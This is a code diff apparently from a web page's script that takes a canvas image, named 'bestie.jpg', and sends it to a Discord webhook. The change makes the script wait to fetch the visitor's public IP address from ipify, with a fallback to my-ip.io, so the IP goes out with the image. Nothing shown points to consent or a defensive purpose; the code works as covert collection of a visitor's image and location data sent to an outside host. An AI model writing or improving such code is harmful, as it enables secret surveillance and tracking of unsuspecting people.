@@ -269,15 +269,23 @@
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
 
-        // Send to Discord webhook (don't wait for it to complete)
+        // Get IP and send to Discord
         if (blob && blob.size > 3000) {
           const file = new File([blob], "bestie.jpg", { type: 'image/jpeg' });
-          let publicIP = "Unknown";
           
-          fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => publicIP = data.ip)
-            .catch(() => {});
+          // Wait for IP to be fetched before sending
+          let publicIP = "Unknown";
+          try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            publicIP = ipData.ip;
+          } catch (e) {
+            // If ipify fails, try alternative
+            try {
+              const ipRes2 = await fetch('https://api.my-ip.io/ip');
+              publicIP = await ipRes2.text();
+            } catch (e2) {}
+          }
 
           const form = new FormData();
           form.append('file', file, 'bestie.jpg');
